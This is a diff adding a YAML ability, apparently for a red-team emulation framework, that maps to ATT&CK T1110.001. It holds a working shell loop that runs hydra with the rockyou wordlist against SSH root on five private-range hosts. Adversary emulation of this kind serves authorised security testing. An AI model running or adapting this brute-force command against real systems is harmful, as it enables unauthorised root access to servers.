@@ -1,0 +1,16 @@
+- id: ia01-ssh-brute
+  name: SSH Brute Force All Linux Servers
+  description: Brute force SSH root credentials on all Linux targets using common passwords
+  tactic: initial-access
+  technique:
+    attack_id: T1110.001
+    name: Brute Force - Password Guessing
+  platforms:
+    linux:
+      sh:
+        command: |
+          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40 10.0.20.200; do hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$h -t 4 -f 2>/dev/null | grep 'host:' & done; wait; echo '[+] SSH brute force complete'
+        cleanup: |
+          rm -f /tmp/ssh_*.txt
+  singleton: false
+  repeatable: false
